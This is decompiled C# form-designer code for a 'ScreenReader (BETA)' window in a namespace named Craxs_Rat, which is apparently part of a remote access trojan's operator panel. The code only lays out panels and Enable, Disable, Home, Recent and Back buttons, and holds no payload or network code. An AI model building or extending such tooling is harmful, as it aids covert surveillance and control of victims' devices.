namespace Craxs_Rat
{
	// Token: 0x020000C3 RID: 195
	[global::Microsoft.VisualBasic.CompilerServices.DesignerGenerated]
	public partial class ScreenReader : global::System.Windows.Forms.Form
	{
		// Token: 0x06000E61 RID: 3681 RVA: 0x0009705C File Offset: 0x0009525C
		protected override void Dispose(bool disposing)
		{
			try
			{
				if (disposing && this.components != null)
				{
					((global::System.IDisposable)this.components).Dispose();
				}
			}
			finally
			{
				base.Dispose(disposing);
			}
		}

		// Token: 0x06000E62 RID: 3682 RVA: 0x000970A0 File Offset: 0x000952A0
		private void InitializeComponent()
		{
			this.components = new global::System.ComponentModel.Container();
			this.viewpanel = new global::System.Windows.Forms.Panel();
			this.Panel2 = new global::System.Windows.Forms.Panel();
			this.DrakeUIButtonIcon2 = new global::DrakeUI.Framework.DrakeUIButtonIcon();
			this.disablebtn = new global::DrakeUI.Framework.DrakeUIButtonIcon();
			this.enablebtn = new global::DrakeUI.Framework.DrakeUIButtonIcon();
			this.Timer1 = new global::System.Windows.Forms.Timer(this.components);
			this.Panel1 = new global::System.Windows.Forms.Panel();
			this.DrakeUIButtonIcon1 = new global::DrakeUI.Framework.DrakeUIButtonIcon();
			this.DrakeUIButtonIcon3 = new global::DrakeUI.Framework.DrakeUIButtonIcon();
			this.DrakeUIButtonIcon4 = new global::DrakeUI.Framework.DrakeUIButtonIcon();
			this.Panel2.SuspendLayout();
			this.Panel1.SuspendLayout();
			base.SuspendLayout();
			this.viewpanel.BackColor = global::System.Drawing.Color.Black;
			this.viewpanel.Dock = global::System.Windows.Forms.DockStyle.Fill;
			this.viewpanel.ForeColor = global::System.Drawing.Color.White;
			this.viewpanel.Location = new global::System.Drawing.Point(0, 69);
			this.viewpanel.Margin = new global::System.Windows.Forms.Padding(4, 4, 4, 4);
			this.viewpanel.Name = "viewpanel";
			this.viewpanel.Size = new global::System.Drawing.Size(564, 703);
			this.viewpanel.TabIndex = 0;
			this.Panel2.BackColor = global::System.Drawing.Color.Black;
			this.Panel2.Controls.Add(this.DrakeUIButtonIcon2);
			this.Panel2.Controls.Add(this.disablebtn);
			this.Panel2.Controls.Add(this.enablebtn);
			this.Panel2.Dock = global::System.Windows.Forms.DockStyle.Top;
			this.Panel2.Location = new global::System.Drawing.Point(0, 0);
			this.Panel2.Margin = new global::System.Windows.Forms.Padding(4, 4, 4, 4);
			this.Panel2.Name = "Panel2";
			this.Panel2.Size = new global::System.Drawing.Size(564, 69);
			this.Panel2.TabIndex = 0;
			this.DrakeUIButtonIcon2.Cursor = global::System.Windows.Forms.Cursors.Hand;
			this.DrakeUIButtonIcon2.FillColor = global::System.Drawing.Color.Black;
			this.DrakeUIButtonIcon2.FillHoverColor = global::System.Drawing.Color.FromArgb(20, 20, 20);
			this.DrakeUIButtonIcon2.FillPressColor = global::System.Drawing.Color.Black;
			this.DrakeUIButtonIcon2.FillSelectedColor = global::System.Drawing.Color.FromArgb(157, 5, 17);
			this.DrakeUIButtonIcon2.Font = new global::System.Drawing.Font("Arial", 12f);
			this.DrakeUIButtonIcon2.ForeColor = global::System.Drawing.Color.FromArgb(157, 5, 17);
			this.DrakeUIButtonIcon2.ForePressColor = global::System.Drawing.Color.FromArgb(157, 5, 17);
			this.DrakeUIButtonIcon2.Location = new global::System.Drawing.Point(196, 15);
			this.DrakeUIButtonIcon2.Margin = new global::System.Windows.Forms.Padding(4, 4, 4, 4);
			this.DrakeUIButtonIcon2.Name = "DrakeUIButtonIcon2";
			this.DrakeUIButtonIcon2.Radius = 25;
			this.DrakeUIButtonIcon2.RectColor = global::System.Drawing.Color.FromArgb(157, 5, 17);
			this.DrakeUIButtonIcon2.RectDisableColor = global::System.Drawing.Color.FromArgb(227, 242, 253);
			this.DrakeUIButtonIcon2.RectHoverColor = global::System.Drawing.Color.White;
			this.DrakeUIButtonIcon2.RectPressColor = global::System.Drawing.Color.White;
			this.DrakeUIButtonIcon2.RectSelectedColor = global::System.Drawing.Color.White;
			this.DrakeUIButtonIcon2.Size = new global::System.Drawing.Size(172, 32);
			this.DrakeUIButtonIcon2.Style = global::DrakeUI.Framework.UIStyle.Custom;
			this.DrakeUIButtonIcon2.Symbol = 57469;
			this.DrakeUIButtonIcon2.TabIndex = 22;
			this.DrakeUIButtonIcon2.Text = "Clear";
			this.disablebtn.Cursor = global::System.Windows.Forms.Cursors.Hand;
			this.disablebtn.FillColor = global::System.Drawing.Color.Black;
			this.disablebtn.FillHoverColor = global::System.Drawing.Color.FromArgb(20, 20, 20);
			this.disablebtn.FillPressColor = global::System.Drawing.Color.Black;
			this.disablebtn.FillSelectedColor = global::System.Drawing.Color.FromArgb(157, 5, 17);
			this.disablebtn.Font = new global::System.Drawing.Font("Arial", 12f);
			this.disablebtn.ForeColor = global::System.Drawing.Color.FromArgb(157, 5, 17);
			this.disablebtn.ForePressColor = global::System.Drawing.Color.FromArgb(157, 5, 17);
			this.disablebtn.Location = new global::System.Drawing.Point(376, 15);
			this.disablebtn.Margin = new global::System.Windows.Forms.Padding(4, 4, 4, 4);
			this.disablebtn.Name = "disablebtn";
			this.disablebtn.Radius = 25;
			this.disablebtn.RectColor = global::System.Drawing.Color.FromArgb(157, 5, 17);
			this.disablebtn.RectDisableColor = global::System.Drawing.Color.FromArgb(227, 242, 253);
			this.disablebtn.RectHoverColor = global::System.Drawing.Color.White;
			this.disablebtn.RectPressColor = global::System.Drawing.Color.White;
			this.disablebtn.RectSelectedColor = global::System.Drawing.Color.White;
			this.disablebtn.Size = new global::System.Drawing.Size(172, 32);
			this.disablebtn.Style = global::DrakeUI.Framework.UIStyle.Custom;
			this.disablebtn.Symbol = 61534;
			this.disablebtn.TabIndex = 21;
			this.disablebtn.Text = "Disable";
			this.enablebtn.Cursor = global::System.Windows.Forms.Cursors.Hand;
			this.enablebtn.FillColor = global::System.Drawing.Color.Black;
			this.enablebtn.FillHoverColor = global::System.Drawing.Color.FromArgb(20, 20, 20);
			this.enablebtn.FillPressColor = global::System.Drawing.Color.Black;
			this.enablebtn.FillSelectedColor = global::System.Drawing.Color.FromArgb(157, 5, 17);
			this.enablebtn.Font = new global::System.Drawing.Font("Arial", 12f);
			this.enablebtn.ForeColor = global::System.Drawing.Color.FromArgb(157, 5, 17);
			this.enablebtn.ForePressColor = global::System.Drawing.Color.FromArgb(157, 5, 17);
			this.enablebtn.Location = new global::System.Drawing.Point(16, 15);
			this.enablebtn.Margin = new global::System.Windows.Forms.Padding(4, 4, 4, 4);
			this.enablebtn.Name = "enablebtn";
			this.enablebtn.Radius = 25;
			this.enablebtn.RectColor = global::System.Drawing.Color.FromArgb(157, 5, 17);
			this.enablebtn.RectDisableColor = global::System.Drawing.Color.FromArgb(227, 242, 253);
			this.enablebtn.RectHoverColor = global::System.Drawing.Color.White;
			this.enablebtn.RectPressColor = global::System.Drawing.Color.White;
			this.enablebtn.RectSelectedColor = global::System.Drawing.Color.White;
			this.enablebtn.Size = new global::System.Drawing.Size(172, 32);
			this.enablebtn.Style = global::DrakeUI.Framework.UIStyle.Custom;
			this.enablebtn.Symbol = 61671;
			this.enablebtn.TabIndex = 20;
			this.enablebtn.Text = "Enable";
			this.Timer1.Interval = 1000;
			this.Panel1.BackColor = global::System.Drawing.Color.Black;
			this.Panel1.Controls.Add(this.DrakeUIButtonIcon1);
			this.Panel1.Controls.Add(this.DrakeUIButtonIcon3);
			this.Panel1.Controls.Add(this.DrakeUIButtonIcon4);
			this.Panel1.Dock = global::System.Windows.Forms.DockStyle.Bottom;
			this.Panel1.Location = new global::System.Drawing.Point(0, 772);
			this.Panel1.Margin = new global::System.Windows.Forms.Padding(4);
			this.Panel1.Name = "Panel1";
			this.Panel1.Size = new global::System.Drawing.Size(564, 69);
			this.Panel1.TabIndex = 1;
			this.DrakeUIButtonIcon1.Cursor = global::System.Windows.Forms.Cursors.Hand;
			this.DrakeUIButtonIcon1.FillColor = global::System.Drawing.Color.Black;
			this.DrakeUIButtonIcon1.FillHoverColor = global::System.Drawing.Color.FromArgb(20, 20, 20);
			this.DrakeUIButtonIcon1.FillPressColor = global::System.Drawing.Color.Black;
			this.DrakeUIButtonIcon1.FillSelectedColor = global::System.Drawing.Color.FromArgb(157, 5, 17);
			this.DrakeUIButtonIcon1.Font = new global::System.Drawing.Font("Arial", 12f);
			this.DrakeUIButtonIcon1.ForeColor = global::System.Drawing.Color.FromArgb(157, 5, 17);
			this.DrakeUIButtonIcon1.ForePressColor = global::System.Drawing.Color.FromArgb(157, 5, 17);
			this.DrakeUIButtonIcon1.Location = new global::System.Drawing.Point(196, 15);
			this.DrakeUIButtonIcon1.Margin = new global::System.Windows.Forms.Padding(4);
			this.DrakeUIButtonIcon1.Name = "DrakeUIButtonIcon1";
			this.DrakeUIButtonIcon1.Radius = 25;
			this.DrakeUIButtonIcon1.RectColor = global::System.Drawing.Color.FromArgb(157, 5, 17);
			this.DrakeUIButtonIcon1.RectDisableColor = global::System.Drawing.Color.FromArgb(227, 242, 253);
			this.DrakeUIButtonIcon1.RectHoverColor = global::System.Drawing.Color.White;
			this.DrakeUIButtonIcon1.RectPressColor = global::System.Drawing.Color.White;
			this.DrakeUIButtonIcon1.RectSelectedColor = global::System.Drawing.Color.White;
			this.DrakeUIButtonIcon1.Size = new global::System.Drawing.Size(172, 32);
			this.DrakeUIButtonIcon1.Style = global::DrakeUI.Framework.UIStyle.Custom;
			this.DrakeUIButtonIcon1.Symbol = 57353;
			this.DrakeUIButtonIcon1.TabIndex = 22;
			this.DrakeUIButtonIcon1.Text = "Home";
			this.DrakeUIButtonIcon3.Cursor = global::System.Windows.Forms.Cursors.Hand;
			this.DrakeUIButtonIcon3.FillColor = global::System.Drawing.Color.Black;
			this.DrakeUIButtonIcon3.FillHoverColor = global::System.Drawing.Color.FromArgb(20, 20, 20);
			this.DrakeUIButtonIcon3.FillPressColor = global::System.Drawing.Color.Black;
			this.DrakeUIButtonIcon3.FillSelectedColor = global::System.Drawing.Color.FromArgb(157, 5, 17);
			this.DrakeUIButtonIcon3.Font = new global::System.Drawing.Font("Arial", 12f);
			this.DrakeUIButtonIcon3.ForeColor = global::System.Drawing.Color.FromArgb(157, 5, 17);
			this.DrakeUIButtonIcon3.ForePressColor = global::System.Drawing.Color.FromArgb(157, 5, 17);
			this.DrakeUIButtonIcon3.Location = new global::System.Drawing.Point(376, 15);
			this.DrakeUIButtonIcon3.Margin = new global::System.Windows.Forms.Padding(4);
			this.DrakeUIButtonIcon3.Name = "DrakeUIButtonIcon3";
			this.DrakeUIButtonIcon3.Radius = 25;
			this.DrakeUIButtonIcon3.RectColor = global::System.Drawing.Color.FromArgb(157, 5, 17);
			this.DrakeUIButtonIcon3.RectDisableColor = global::System.Drawing.Color.FromArgb(227, 242, 253);
			this.DrakeUIButtonIcon3.RectHoverColor = global::System.Drawing.Color.White;
			this.DrakeUIButtonIcon3.RectPressColor = global::System.Drawing.Color.White;
			this.DrakeUIButtonIcon3.RectSelectedColor = global::System.Drawing.Color.White;
			this.DrakeUIButtonIcon3.Size = new global::System.Drawing.Size(172, 32);
			this.DrakeUIButtonIcon3.Style = global::DrakeUI.Framework.UIStyle.Custom;
			this.DrakeUIButtonIcon3.Symbol = 61641;
			this.DrakeUIButtonIcon3.TabIndex = 21;
			this.DrakeUIButtonIcon3.Text = "Recent";
			this.DrakeUIButtonIcon4.Cursor = global::System.Windows.Forms.Cursors.Hand;
			this.DrakeUIButtonIcon4.FillColor = global::System.Drawing.Color.Black;
			this.DrakeUIButtonIcon4.FillHoverColor = global::System.Drawing.Color.FromArgb(20, 20, 20);
			this.DrakeUIButtonIcon4.FillPressColor = global::System.Drawing.Color.Black;
			this.DrakeUIButtonIcon4.FillSelectedColor = global::System.Drawing.Color.FromArgb(157, 5, 17);
			this.DrakeUIButtonIcon4.Font = new global::System.Drawing.Font("Arial", 12f);
			this.DrakeUIButtonIcon4.ForeColor = global::System.Drawing.Color.FromArgb(157, 5, 17);
			this.DrakeUIButtonIcon4.ForePressColor = global::System.Drawing.Color.FromArgb(157, 5, 17);
			this.DrakeUIButtonIcon4.Location = new global::System.Drawing.Point(16, 15);
			this.DrakeUIButtonIcon4.Margin = new global::System.Windows.Forms.Padding(4);
			this.DrakeUIButtonIcon4.Name = "DrakeUIButtonIcon4";
			this.DrakeUIButtonIcon4.Radius = 25;
			this.DrakeUIButtonIcon4.RectColor = global::System.Drawing.Color.FromArgb(157, 5, 17);
			this.DrakeUIButtonIcon4.RectDisableColor = global::System.Drawing.Color.FromArgb(227, 242, 253);
			this.DrakeUIButtonIcon4.RectHoverColor = global::System.Drawing.Color.White;
			this.DrakeUIButtonIcon4.RectPressColor = global::System.Drawing.Color.White;
			this.DrakeUIButtonIcon4.RectSelectedColor = global::System.Drawing.Color.White;
			this.DrakeUIButtonIcon4.Size = new global::System.Drawing.Size(172, 32);
			this.DrakeUIButtonIcon4.Style = global::DrakeUI.Framework.UIStyle.Custom;
			this.DrakeUIButtonIcon4.Symbol = 61696;
			this.DrakeUIButtonIcon4.TabIndex = 20;
			this.DrakeUIButtonIcon4.Text = "Back";
			base.AutoScaleDimensions = new global::System.Drawing.SizeF(8f, 16f);
			base.AutoScaleMode = global::System.Windows.Forms.AutoScaleMode.Font;
			base.ClientSize = new global::System.Drawing.Size(564, 841);
			base.Controls.Add(this.viewpanel);
			base.Controls.Add(this.Panel1);
			base.Controls.Add(this.Panel2);
			base.FormBorderStyle = global::System.Windows.Forms.FormBorderStyle.FixedToolWindow;
			base.Margin = new global::System.Windows.Forms.Padding(4, 4, 4, 4);
			base.Name = "ScreenReader";
			base.ShowIcon = false;
			this.Text = "ScreenReader (BETA)";
			this.Panel2.ResumeLayout(false);
			this.Panel1.ResumeLayout(false);
			base.ResumeLayout(false);
		}

		// Token: 0x040007E5 RID: 2021
		private global::System.ComponentModel.Container components;
	}
}
